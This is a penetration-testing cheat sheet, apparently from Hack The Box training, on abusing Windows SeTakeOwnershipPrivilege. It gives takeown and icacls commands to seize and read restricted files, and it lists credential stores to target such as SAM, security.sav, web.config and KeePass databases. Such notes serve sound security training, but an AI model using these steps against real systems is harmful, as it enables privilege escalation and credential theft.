### Technique Name:

SeTakeOwnershipPrivilege
### Summary:

`SeTakeOwnershipPrivilege` allows a user to take ownership of securable objects such as files, folders, registry keys, services, and Active Directory objects, regardless of the object's current permissions. Once ownership is taken, the user can grant themselves full control over the object using tools like `icacls`. This can be leveraged to access restricted files containing credentials, configuration, or sensitive business logic, which can help in privilege escalation or lateral movement.
### Conditions:

- User has the `SeTakeOwnershipPrivilege` assigned (can be enabled if disabled)
- Requires access to local PowerShell or CMD
- Potentially needs a file target with sensitive information but restricted permissions
- Target object must be modifiable via ownership change (e.g., not in use or protected by AV)
### Enumeration:

```powershell
# Check if the current user has the privilege
whoami /priv

# Check ownership of a target file or directory
Get-ChildItem -Path 'C:\Path\To\Target.txt' | Select Name, @{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}

# View ownership using legacy CMD (can show inaccessible owner info)
cmd /c dir /q "C:\Path\To\TargetDirectory"
```
### Exploitation:

```powershell
# 1. Enable the privilege if not already active (requires helper script)
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

# 2. Take ownership of the target file
takeown /f "C:\Path\To\Target.txt"

# 3. Verify new ownership
Get-Acl "C:\Path\To\Target.txt" | Format-List Owner

# 4. Grant full control to your user
icacls "C:\Path\To\Target.txt" /grant htb-student:F

# 5. Read the file contents
cat "C:\Path\To\Target.txt"
```
### Post-Exploitation:

* Extract sensitive data (e.g., credentials from `cred.txt`, `web.config`, `.kdbx`, etc.)
* Use credentials for lateral movement or privilege escalation
* Document object access and ownership changes carefully
* Restore original ownership and permissions if possible (or alert client)
* Refrain from modifying production or service-critical files unless permitted
#### Files of Interest:

- `c:\inetpub\wwwroot\web.config`
- `%WINDIR%\repair\sam`
- `%WINDIR%\system32\config\security.sav`
- KeePass DBs (`*.kdbx`), config files, OneNote, or any creds/notes/scripts folders
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #User_Privs